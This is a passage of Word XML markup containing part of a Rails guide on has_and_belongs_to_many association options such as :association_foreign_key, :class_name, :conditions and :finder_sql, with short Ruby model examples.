        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4509FF9A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9F99C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DB312D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FA4293" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D8AFDC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:uniq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DF5613" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF5F7DC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:association_foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A328E69" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By convention, Rails assumes that the column in the join table used to hold the foreign key pointing to the other model is the name of that model with the suffix </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> added. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:association_foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you set the name of the foreign key directly:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708E23AA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:association_foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options are useful when setting up a many-to-many self-join. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="7FFF9A13" w14:textId="77777777" w:rsidTr="00C24ACF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17FB2294" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="186A37F2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :friends, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "User",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DF110E3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "this_user_id",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6421A35D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :association_foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "other_user_id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79850AE3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0BC6D599" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FD0A73" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, Rails will save any loaded members and destroy members that are marked for destruction whenever you save the parent object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3786BCA3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FF9168" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the name of the other model cannot be derived from the association name, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to supply the model name. For example, if a part has many assemblies, but the actual name of the model containing assemblies is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gadget</w:t>
      </w:r>
      <w:r>
        <w:t>, you’d set things up this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7824"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="12137D03" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="557A149A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Parts &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47753F45" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Gadget"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78092669" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="10AFA11A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC42116" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you specify the conditions that the associated object must meet (in the syntax used by an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>WHERE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5424"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="14ED616C" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B361D23" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Parts &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7608A0E0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4410B76C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :conditions</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "factory = 'Seattle'"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5059826D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="71BF2D32" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also set conditions via a hash:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5759"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="38CF63CE" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E35C383" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Parts &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F9A453D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C5F2E65" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :conditions</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { :factory</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Seattle'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A83AEA2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="07349F58" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you use a hash-style </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, then record creation via this association will be automatically scoped using the hash. In this case, using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@parts.assemblies.create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@parts.assemblies.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will create orders where the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>factory</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> column has the value “Seattle”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D1ADB7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F02088A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normally Rails automatically generates the proper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to count the association members. With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, you can specify a complete </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement to count them yourself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0E85C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you specify </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the counter </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be generated by substituting the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT ... FROM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause of your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT COUNT(*) FROM</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142EEFA6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:delete_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AC6A4D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normally Rails automatically generates the proper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to remove links between the associated classes. With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:delete_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, you can specify a complete </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement to delete them yourself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C76F240" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:extend</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3858C4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:extend</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option specifies a named module to extend the association proxy. Association extensions are discussed in detail </w:t>
      </w:r>
      <w:hyperlink r:id="rId219" w:anchor="association-extensions" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>later in this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB23709" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F63A52" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normally Rails automatically generates the proper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to fetch the association members. With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:finder_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, you can specify a complete </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement to fetch them yourself. If fetching objects requires complex multi-table </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t>, this may be necessary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622844C3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.9 </w:t>
      </w:r>
